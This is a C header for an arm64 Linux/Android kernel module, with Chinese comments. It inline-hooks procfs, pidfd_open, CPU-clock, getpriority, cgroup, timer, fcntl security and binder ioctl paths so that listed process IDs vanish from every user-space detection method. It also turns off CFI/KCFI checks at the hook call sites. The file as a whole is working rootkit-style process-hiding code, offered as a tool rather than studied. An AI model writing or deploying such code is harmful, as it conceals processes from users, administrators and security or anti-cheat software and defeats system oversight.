/*
用户态探测手段：
1. /proc：通过 getdents64 枚举 PID 目录，或访问 PID 路径触发查找及缓存复验。
2. pidfd：通过 pidfd_open 按 PID 获取进程句柄。
3. CPU 时钟：通过 clock_gettime/clock_getres 查询进程 PROF、VIRT、SCHED 时钟，
    或通过 timer_create 创建绑定这些时钟的未启动定时器。
4. 优先级：通过 getpriority(PRIO_PROCESS, who) 按 PID 查询 nice 值。
5. cgroup：读取 v1 的 cgroup.procs/tasks 或 v2 的 cgroup.procs/cgroup.threads。
6. fcntl：通过 F_SETOWN/F_GETOWN 设置、读回文件 owner，或通过 F_SETOWN_EX/F_GETOWN_EX
    使用 F_OWNER_PID/F_OWNER_TID 指定进程或线程 owner。
7. binder/hwbinder：通过 BINDER_GET_FROZEN_INFO 按 PID 查询驱动注册对象的冻结状态。

按 g_hidden_tgids 过滤任务相关查询。各入口根据 PID、PID 对象或任务指针匹配线程组；
安装和删除接口接收 TGID，不保存线程 PID。

现有 hook 行为：
1. proc_pid_readdir
    仅在本次调用的 dir_context 中包装 actor，过滤 proc 根目录的隐藏 TGID 数字名称。
    原生 next_tgid、hidepid、dentry 实例化、目录位置和任务引用管理保持不变；
    不依赖 proc_fill_cache 是否内联，其他目录和其他文件系统的 actor 不受影响。
    回放和原 actor 均为跳板间接调用，调用点关闭 CFI/KCFI
2. proc_pid_lookup
    按数字目录名查任务；TGID 命中时跳过原函数，返回 ERR_PTR(-ENOENT)。
3. pid_revalidate
    按数字目录名重新查任务，不读取 inode 原绑定的 PID，也不限于 proc 根目录子项。
    命中返回 0，通知 VFS 缓存目录项无效；不保证后续一定调用 proc_pid_lookup。
4. __arm64_sys_pidfd_open
    flags 合法且 PID 所属 TGID 命中时返回 -ESRCH；其余交给原系统调用。
5. __arm64_sys_clock_gettime / __arm64_sys_clock_getres
    过滤编码 PID 的 PROF/VIRT/SCHED 进程 CPU 时钟；命中返回 -EINVAL。
    线程时钟及其他 clockid 放行。
6. __arm64_sys_getpriority
    仅处理 PRIO_PROCESS 且 who 非零的查询；TGID 命中返回 -ESRCH，其余放行。
7. cgroup_seqfile_show
    仅过滤 v1 的 cgroup.procs/tasks 和 v2 的 cgroup.procs/cgroup.threads。
    v1 按 PID 列表匹配，v2 直接匹配任务 TGID；命中返回 0，不输出字节或空行。
    原生 next 继续推进迭代位置，不修改 PID 列表、迭代器或缓存。
8. posix_cpu_timer_create
    过滤相同的三种进程 CPU 时钟；命中返回 -EINVAL，由 do_timer_create 回收对象。
    不跳过整个 timer_create，保留 ID 分配、created_timer_id 写入和失败清理顺序。
9. security_file_fcntl
    原生及 compat 共用 file/cmd/arg，外层负责 fd 引用；不访问目标进程的 fd 表。
    F_SETOWN 的正 PID、F_OWNER_PID 按 PIDTYPE_TGID 匹配，F_OWNER_TID 按 PIDTYPE_PID
    匹配；进程组 owner 和不返回 PID 的 F_GETOWNER_UIDS 放行。隐藏 SET 返回 -ESRCH，
    不改已有 owner；GET 按保存的 pid_type，在 owner 锁和 RCU 内判断 PID 对象。
    GET 命中时预置 0 或保留 type 的 pid=0 结构，但返回 0 后仍会执行 do_fcntl，
    不能保证最终读回为空 owner。只有非零错误返回才阻止 do_fcntl。
    未接管时继续原生 LSM；接管时仅跳过 security_file_fcntl 本身。
10. binder_ioctl
    binder/hwbinder 共用；仅预读 BINDER_GET_FROZEN_INFO，不处理 BINDER_FREEZE。
    校验命令及结构大小后用 copy_from_user 读取；TGID 命中返回 -EINVAL，复制失败或
    未命中则放行原生处理。此判断不证明目标 Binder 对象仍活跃。

*/
#ifndef HIDE_TASK_H
#define HIDE_TASK_H

#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/sched.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/mount.h>
#include <linux/err.h>
#include <linux/version.h>
#include <linux/mutex.h>
#include <linux/rcupdate.h>
#include <linux/cgroup.h>
#include <linux/kernfs.h>
#include <linux/seq_file.h>
#include <linux/pid_namespace.h>
#include <linux/proc_fs.h>
#include <linux/posix-timers.h>
#include <linux/fcntl.h>
#include <linux/uaccess.h>
#include <uapi/linux/pidfd.h>
#include <uapi/linux/resource.h>
#include <uapi/linux/android/binder.h>

#include "export_fun.h"
#include "inline_hook_frame.h"
#include "klog/lsdriver_log.h"

#define HIDE_TASK_MAX_TGIDS 0x10

// 隐藏表保存线程组 TGID；各入口按自身参数形式匹配。
static pid_t g_hidden_tgids[HIDE_TASK_MAX_TGIDS];
static DEFINE_MUTEX(g_hide_task_lock);

// 多个入口共用 TGID 匹配，0 表示空槽。
static bool hide_task_match_tgid(pid_t tgid)
{
    if (tgid <= 0) return false;

    for (int i = 0; i < HIDE_TASK_MAX_TGIDS; i++)
    {
        if (READ_ONCE(g_hidden_tgids[i]) == tgid) return true;
    }
    return false;
}

// 按调用者 PID namespace 查任务，在 RCU 内匹配 task->tgid；支持主线程和其他线程 PID。
static bool hide_task_match_pid(pid_t pid)
{
    bool matched = false;

    if (pid <= 0) return false;

    rcu_read_lock();
    struct task_struct *task = find_task_by_vpid(pid);
    if (task) matched = hide_task_match_tgid(READ_ONCE(task->tgid));
    rcu_read_unlock();

    return matched;
}

// 按 DT_DIR 数字名解析 PID，再按调用者 PID namespace 匹配；不识别文件系统。
static bool hide_task_match_pid_name(const char *name, int namlen, unsigned int d_type)
{
    pid_t pid = 0;

    // 排除 d_type 的附加标志，仅比较文件类型位。
    if ((d_type & S_DT_MASK) != DT_DIR || !name || namlen <= 0 || namlen > 10) return false;

    // 按 namlen 解析，不依赖 NUL 结尾；拒绝符号、非数字和整数溢出。
    for (int i = 0; i < namlen; i++)
    {
        if (name[i] < '0' || name[i] > '9') return false;

        int digit = name[i] - '0';
        if (pid > (INT_MAX - digit) / 10) return false;
        pid = pid * 10 + digit;
    }

    return hide_task_match_pid(pid);
}

// 编码 PID 的 CPU clockid：bit 2=0 为进程时钟，低两位 0/1/2 表示 PROF/VIRT/SCHED。
static bool hide_task_match_process_clock(int clock_id)
{
    unsigned int type = (unsigned int)clock_id & 3U;

    if (((unsigned int)clock_id & 4U) || type > 2U) return false;

    return hide_task_match_pid((pid_t) ~(clock_id >> 3));
}

static int (*fn_proc_pid_readdir)(struct file *file, struct dir_context *ctx);

// 使用调用本地的 dir_context 副本，原始 filldir 仍从原 ctx 找到自己的缓冲区。
struct hide_task_dir_context
{
    struct dir_context ctx;
    struct dir_context *original_ctx;
};

/*
本地 5.10/5.15 的 actor 返回 int，0 表示当前项处理成功；6.1+ 返回 bool，true 表示成功。
经跳板调用原 actor，不能对其入口执行 CFI/KCFI 检查；
*/
__attribute__((no_sanitize("cfi", "kcfi")))
#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 1, 0)
static int hide_task_dir_actor(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
#else
static bool hide_task_dir_actor(struct dir_context *ctx, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type)
#endif
{
    struct hide_task_dir_context *hide_ctx = container_of(ctx, struct hide_task_dir_context, ctx);
    struct dir_context *original_ctx = hide_ctx->original_ctx;
    pid_t tgid = 0;
    int i = 0;

    // 按原生十进制 TGID 名称解析，拒绝空名称、超长名称和 pid_t 溢出。
    if (namlen > 0 && namlen <= 10)
    {
        for (; i < namlen; i++)
        {
            if (name[i] < '0' || name[i] > '9') break;

            int digit = name[i] - '0';
            if (tgid > (INT_MAX - digit) / 10) break;
            tgid = tgid * 10 + digit;
        }
    }
    if (namlen > 0 && i == namlen && hide_task_match_tgid(tgid))
#if LINUX_VERSION_CODE < KERNEL_VERSION(6, 1, 0)
        return 0;
#else
        return true;
#endif

    original_ctx->pos = ctx->pos;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 18, 0)
    // 原 actor 会递减原 ctx 的 count；同步副本，避免枚举期间看到过期容量。
    original_ctx->count = ctx->count;
#endif
    int ret = original_ctx->actor(original_ctx, name, namlen, offset, ino, d_type);
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 18, 0)
    ctx->count = original_ctx->count;
#endif
    return ret;
}

/*
只替换本次调用中副本的 actor，让原函数通过跳板使用该副本完成枚举。
原 ctx 的 actor 从未修改，无需恢复；仅按原生语义同步 pos/count。
回放入口没有 CFI/KCFI 类型元数据，仅关闭本调用点检查；
此处已经执行过原函数，返回 1 阻止框架再次回放原函数。
*/
__attribute__((no_sanitize("cfi", "kcfi"))) static int proc_pid_readdir_hook_work(struct pt_regs *regs)
{
    struct dir_context *ctx = (struct dir_context *)regs->regs[1];
    struct hide_task_dir_context hide_ctx = {
        .ctx = *ctx,
        .original_ctx = ctx,
    };
    hide_ctx.ctx.actor = hide_task_dir_actor;

    int ret = fn_proc_pid_readdir((struct file *)regs->regs[0], &hide_ctx.ctx);
    ctx->pos = hide_ctx.ctx.pos;
    regs->regs[0] = (unsigned long)ret;
    return 1;
}

// 按数字目录名匹配；命中返回 ERR_PTR(-ENOENT)。
static int proc_pid_lookup_hook_work(struct pt_regs *regs)
{
    const struct dentry *dentry = (const struct dentry *)regs->regs[0];

    if (!hide_task_match_pid_name(dentry->d_name.name, dentry->d_name.len, DT_DIR)) return 0;

    regs->regs[0] = (unsigned long)ERR_PTR(-ENOENT);
    return 1;
}

// 按数字目录名重新查任务；命中返回 0，通知 VFS 缓存目录项无效。
static int pid_revalidate_hook_work(struct pt_regs *regs)
{
    bool legacy_signature = __builtin_types_compatible_p(typeof(((struct dentry_operations *)0)->d_revalidate), int (*)(struct dentry *, unsigned int));
    const struct dentry *dentry = (const struct dentry *)regs->regs[legacy_signature ? 0 : 2];

    if (!hide_task_match_pid_name(dentry->d_name.name, dentry->d_name.len, DT_DIR)) return 0;

    regs->regs[0] = 0;
    return 1;
}

// pidfd_open 的 x0 指向系统调用现场；隐藏表中的 TGID 按不存在处理。
static int pidfd_open_hook_work(struct pt_regs *regs)
{
    const struct pt_regs *sys_regs = (const struct pt_regs *)(uintptr_t)regs->regs[0];
    if (!sys_regs) return 0;

    unsigned int allowed_flags = PIDFD_NONBLOCK;
#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
    allowed_flags |= PIDFD_THREAD;
#endif
    if ((unsigned int)sys_regs->regs[1] & ~allowed_flags) return 0;
    if (!hide_task_match_pid((pid_t)sys_regs->regs[0])) return 0;

    regs->regs[0] = (unsigned long)-ESRCH;
    return 1;
}

// 命中的 PROF/VIRT/SCHED 进程 CPU 时钟查询返回 -EINVAL。
static int hide_task_cpu_clock_hook_work(struct pt_regs *regs)
{
    const struct pt_regs *sys_regs = (const struct pt_regs *)(uintptr_t)regs->regs[0];
    if (!sys_regs || !hide_task_match_process_clock((int)sys_regs->regs[0])) return 0;

    regs->regs[0] = (unsigned long)-EINVAL;
    return 1;
}

// PRIO_PROCESS 的 who 是 PID；原生没有目标任务时返回 -ESRCH，而不是 nice 值 20。
static int getpriority_hook_work(struct pt_regs *regs)
{
    const struct pt_regs *sys_regs = (const struct pt_regs *)(uintptr_t)regs->regs[0];
    if (!sys_regs || sys_regs->regs[0] != PRIO_PROCESS) return 0;

    pid_t who = (pid_t)sys_regs->regs[1];
    if (!hide_task_match_pid(who)) return 0;

    regs->regs[0] = (unsigned long)-ESRCH;
    return 1;
}

// v1 cgroup.procs 保存 TGID 而非线程 PID；按命名空间中的 TGID 对象身份比较。
static int cgroup_seqfile_show_hook_work(struct pt_regs *regs)
{
    struct seq_file *seq = (struct seq_file *)regs->regs[0];
    void *arg = (void *)regs->regs[1];
    const struct cftype *cft = seq_cft(seq);
    const char *name = cft->name;
    bool hidden;

    if (__builtin_strcmp(name, "cgroup.procs") && __builtin_strcmp(name, "tasks") && __builtin_strcmp(name, "cgroup.threads")) return 0;

    /*
    已核对的目标版本中，按这些文件的 seq_stop 区分参数：
    v1 使用 cgroup_pidlist_start/next/stop，设置 seq_stop，arg 指向 pid_t；
    procs 保存 TGID，tasks 保存线程 PID。
    v2 使用 css_task_iter_next，无 seq_stop，arg 为 task_struct *；
    procs 遍历线程组 leader，threads 遍历线程。
    核心 v2 文件没有 __CFTYPE_ONLY_ON_DFL 标志；不引用 cgrp_dfl_root，以免增加 KMI 符号依赖。
    */
    if (!cft->seq_stop) hidden = hide_task_match_tgid(READ_ONCE(((struct task_struct *)arg)->tgid));
    else if (__builtin_strcmp(name, "cgroup.procs") == 0)
    {
        // v1 cgroup.procs 保存 TGID；按命名空间中的 TGID 对象身份比较。
        pid_t tgid = *(pid_t *)arg;

        hidden = false;
        if (tgid > 0)
        {
            rcu_read_lock();
            struct pid *pid = find_vpid(tgid);
            if (pid)
            {
                for (int i = 0; i < HIDE_TASK_MAX_TGIDS; i++)
                {
                    pid_t hidden_tgid = READ_ONCE(g_hidden_tgids[i]);
                    if (hidden_tgid > 0 && pid == find_pid_ns(hidden_tgid, &init_pid_ns))
                    {
                        hidden = true;
                        break;
                    }
                }
            }
            rcu_read_unlock();
        }
    }
    else hidden = hide_task_match_pid(*(pid_t *)arg);
    if (!hidden) return 0;

    // 不输出当前项；原生 next 仍推进迭代位置，用户输出不增加字节。
    regs->regs[0] = 0;
    return 1;
}

// timer_create 在此已分配定时器 ID；拒绝 CPU 时钟初始化后由原生失败出口释放对象。
static int hide_task_cpu_timer_create_hook_work(struct pt_regs *regs)
{
    const struct k_itimer *timer = (const struct k_itimer *)regs->regs[0];
    if (!timer || !hide_task_match_process_clock(timer->it_clock)) return 0;

    regs->regs[0] = (unsigned long)-EINVAL;
    return 1;
}

// security_file_fcntl(file, cmd, arg)：调用者已持有 fd 引用，原生与 compat fcntl 共用此入口。
static int hide_task_security_fcntl_hook_work(struct pt_regs *regs)
{
    struct file *file = (struct file *)regs->regs[0];
    unsigned int cmd = (unsigned int)regs->regs[1];
    unsigned long arg = regs->regs[2];
    bool set_owner = cmd == F_SETOWN || cmd == F_SETOWN_EX;
    bool get_owner = cmd == F_GETOWN || cmd == F_GETOWN_EX;
    struct fown_struct *f_owner;
    struct f_owner_ex owner = {};
    enum pid_type pid_type = PIDTYPE_TGID;
    bool hidden;

    if (!file || (!set_owner && !get_owner)) return 0;

    if (set_owner)
    {
        if (cmd == F_SETOWN_EX)
        {
            // 与原生 f_setown_ex 一样使用可缺页复制；此处尚未进入本函数的锁保护区。
            if (copy_from_user(&owner, (void __user *)arg, sizeof(owner)))
            {
                regs->regs[0] = (unsigned long)-EFAULT;
                return 1;
            }

            if (owner.type == F_OWNER_PID) pid_type = PIDTYPE_TGID;
            else if (owner.type == F_OWNER_TID) pid_type = PIDTYPE_PID;
            else return 0; // 非本次 F_OWNER_PID/TID 探测，保留 PGRP 和非法 type 的原生处理。
        }

        // 普通 PID/TID 按任务所属线程组匹配；不把进程组编号当作 PID。
        pid_t pid = cmd == F_SETOWN ? (pid_t)arg : owner.pid;

        hidden = false;
        if (pid > 0)
        {
            rcu_read_lock();
            struct task_struct *task = pid_task(find_vpid(pid), pid_type);
            if (task) hidden = hide_task_match_tgid(READ_ONCE(task->tgid));
            rcu_read_unlock();
        }
        if (!hidden) return 0;

        // 隐藏 owner 按不存在的任务处理；不修改文件已有 owner。
        regs->regs[0] = (unsigned long)-ESRCH;
        return 1;
    }

#if LINUX_VERSION_CODE >= KERNEL_VERSION(6, 12, 0)
    f_owner = file_f_owner(file);
#else
    f_owner = &file->f_owner;
#endif
    if (!f_owner) return 0; // 新版未分配 f_owner 时，原生读回即为空 owner。

    // 在 owner 读锁和 RCU 保护下匹配 PID 对象，并快照 pid_type。
    hidden = false;
    read_lock_irq(&f_owner->lock);
    pid_type = f_owner->pid_type;
    if (pid_type == PIDTYPE_TGID || pid_type == PIDTYPE_PID)
    {
        rcu_read_lock();
        struct task_struct *task = pid_task(f_owner->pid, pid_type);
        if (task) hidden = hide_task_match_tgid(READ_ONCE(task->tgid));
        rcu_read_unlock();
    }
    read_unlock_irq(&f_owner->lock);
    if (!hidden) return 0; // 非目标 PID/TID、PGRP 和失效 PID 均保留原生处理。

    // 这里只设置 security_file_fcntl 的结果；返回 0 后调用方仍会执行 do_fcntl。
    if (cmd == F_GETOWN) regs->regs[0] = 0;
    else
    {
        // 预写保留快照类型的 pid=0 结构；允许缺页，但后续原生 GET 仍可能覆盖结果。
        owner.type = pid_type == PIDTYPE_TGID ? F_OWNER_PID : F_OWNER_TID;
        regs->regs[0] = copy_to_user((void __user *)arg, &owner, sizeof(owner)) ? (unsigned long)-EFAULT : 0;
    }
    return 1;
}

// hwbinder 与 binder 共用驱动入口；只按命令和 UAPI 参数识别 frozen GET 查询。
static int hide_task_binder_ioctl_hook_work(struct pt_regs *regs)
{
    unsigned int cmd = (unsigned int)regs->regs[1];
    struct binder_frozen_status_info info;

    if (cmd != BINDER_GET_FROZEN_INFO || _IOC_SIZE(cmd) != sizeof(info)) return 0;
    if (copy_from_user(&info, (void __user *)regs->regs[2], sizeof(info))) return 0;
    if (!hide_task_match_pid((pid_t)info.pid)) return 0;

    regs->regs[0] = (unsigned long)-EINVAL;
    return 1;
}
// clang-format off
static struct hook_entry g_hide_task_hooks[] = {
    HOOK_ENTRY("proc_pid_readdir", proc_pid_readdir_hook_work), 
    HOOK_ENTRY("proc_pid_lookup", proc_pid_lookup_hook_work), 
    HOOK_ENTRY("pid_revalidate", pid_revalidate_hook_work), 
    HOOK_ENTRY("__arm64_sys_pidfd_open", pidfd_open_hook_work), 
    HOOK_ENTRY("__arm64_sys_clock_gettime", hide_task_cpu_clock_hook_work), 
    HOOK_ENTRY("__arm64_sys_clock_getres", hide_task_cpu_clock_hook_work), 
    HOOK_ENTRY("__arm64_sys_getpriority", getpriority_hook_work), 
    HOOK_ENTRY("cgroup_seqfile_show", cgroup_seqfile_show_hook_work), 
    HOOK_ENTRY("posix_cpu_timer_create", hide_task_cpu_timer_create_hook_work), 
    HOOK_ENTRY("security_file_fcntl", hide_task_security_fcntl_hook_work), 
    HOOK_ENTRY("binder_ioctl", hide_task_binder_ioctl_hook_work),
};
// clang-format on
// 首个 TGID 登记前安装 hook；安装成功后写表。
static int hide_task_install(pid_t tgid)
{
    int ret = 0;
    int empty = -1;
    bool has_hidden_tgid = false;

    if (tgid <= 0)
    {
        ls_log_always_tag("task_hide", "install failed: invalid TGID %d\n", tgid);
        return -EINVAL;
    }

    mutex_lock(&g_hide_task_lock);

    for (int i = 0; i < HIDE_TASK_MAX_TGIDS; i++)
    {
        pid_t hidden_tgid = READ_ONCE(g_hidden_tgids[i]);

        if (hidden_tgid == tgid) goto out_unlock;
        if (hidden_tgid) has_hidden_tgid = true;
        else if (empty < 0) empty = i;
    }

    if (empty < 0)
    {
        ret = -ENOSPC;
        ls_log_always_tag("task_hide", "install failed: TGID table full, TGID %d\n", tgid);
        goto out_unlock;
    }

    if (!has_hidden_tgid)
    {
        ret = inline_hook_install(g_hide_task_hooks);
        if (ret)
        {
            ls_log_always_tag("task_hide", "proc PID hooks install failed: %d, TGID %d\n", ret, tgid);
            goto out_unlock;
        }

        // 回放必须进入本 hook 的跳板，直接调用原符号会递归进入 hook。
        fn_proc_pid_readdir = (void *)(g_hide_task_hooks[0].trampoline + TRAMP_REPLAY_INST_INDEX);
    }

    // hook 安装成功后再写隐藏表，避免表里有 TGID 但拦截点没生效。
    WRITE_ONCE(g_hidden_tgids[empty], tgid);

out_unlock:
    mutex_unlock(&g_hide_task_lock);
    return ret;
}

// 删除命中的 TGID；删除最后一项时卸载 hook。
static void hide_task_remove(pid_t tgid)
{
    bool has_hidden_tgid = false;
    bool removed = false;

    if (tgid <= 0)
    {
        ls_log_always_tag("task_hide", "remove failed: invalid TGID %d\n", tgid);
        return;
    }

    mutex_lock(&g_hide_task_lock);
    for (int i = 0; i < HIDE_TASK_MAX_TGIDS; i++)
    {
        pid_t hidden_tgid = READ_ONCE(g_hidden_tgids[i]);

        if (hidden_tgid == tgid)
        {
            WRITE_ONCE(g_hidden_tgids[i], 0);
            removed = true;
        }
        else if (hidden_tgid) has_hidden_tgid = true;
    }

    if (removed && !has_hidden_tgid) inline_hook_remove(g_hide_task_hooks);
    mutex_unlock(&g_hide_task_lock);
}

#endif /* HIDE_TASK_H */
